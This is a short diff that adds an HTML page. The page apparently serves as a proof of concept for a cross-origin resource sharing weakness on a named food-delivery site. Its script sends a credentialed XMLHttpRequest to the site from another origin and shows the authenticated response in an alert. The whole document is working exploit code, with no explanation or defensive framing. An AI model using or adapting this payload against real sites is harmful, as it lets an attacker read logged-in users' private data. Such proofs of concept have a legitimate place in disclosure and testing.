@@ -1,0 +1,9 @@
+<html>
+<script>
+alert();
+ var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://www.zomato.com/abudhabi',true); req.withCredentials = true; req.send('{}'); function reqListener() {
+
+ alert(this.responseText); };
+
+</script>
+</html>
